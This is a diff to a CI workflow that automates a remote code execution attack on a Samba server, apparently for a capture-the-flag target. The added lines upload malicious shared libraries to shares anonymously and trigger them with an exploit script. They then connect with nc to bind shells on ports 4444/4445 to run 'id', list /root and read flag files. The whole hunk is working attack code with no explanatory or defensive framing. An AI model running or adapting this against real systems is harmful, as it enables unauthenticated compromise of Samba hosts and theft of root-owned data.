@@ -124,11 +124,28 @@ jobs:
             echo "No disk shares found." | tee -a "$OUT"
           fi
 
-          bases="/tmp /var/tmp /shared /share /shares /srv /srv/samba /var/samba /var/lib/samba /home /home/samba /mnt /mnt/usb /media /data /volume1 /volume2 /volume3"
+          direct_dirs="/share /mnt /home/share /home/mnt /srv/share /srv/samba/share /var/samba/share /var/lib/samba/share /tmp/share /var/tmp/share /data/share /shared /media/share /mnt/share /opt/share /samba/share /usr/local/samba/var/share"
+          bases="/tmp /var/tmp /shared /share /shares /srv /srv/samba /var/samba /var/lib/samba /home /home/samba /mnt /mnt/usb /media /data /volume1 /volume2 /volume3 /opt /usr/local/samba/var"
           for share in $(cat shares.txt); do
             echo "Testing share: $share" | tee -a "$OUT"
             for so in libspg4444.so libspg4445.so; do
               smbclient "//$TARGET/$share" -N -c "put $so $so; ls" 2>&1 | tee -a "$OUT" || true
+            done
+            for dir in $direct_dirs; do
+              for so in libspg4444.so libspg4445.so; do
+                module="$dir/$so"
+                echo "Trigger $module" | tee -a "$OUT"
+                python3 exploit.py -t "$TARGET" -m "$module" 2>&1 | tee -a "$OUT" || true
+                sleep 1
+                for bp in 4444 4445; do
+                  printf 'id; hostname; ls -la /root; for f in /root/flag* /root/*flag*; do echo ===$f===; cat "$f"; done; exit\n' \
+                    | nc -w 6 "$TARGET" "$bp" 2>&1 | tee -a "$OUT" || true
+                done
+                if grep -Eiq 'flag|cve\{|sec\{|samba\{|uid=' "$OUT"; then
+                  echo "Potential result found." | tee -a "$OUT"
+                  exit 0
+                fi
+              done
             done
             for base in $bases; do
               for so in libspg4444.so libspg4445.so; do
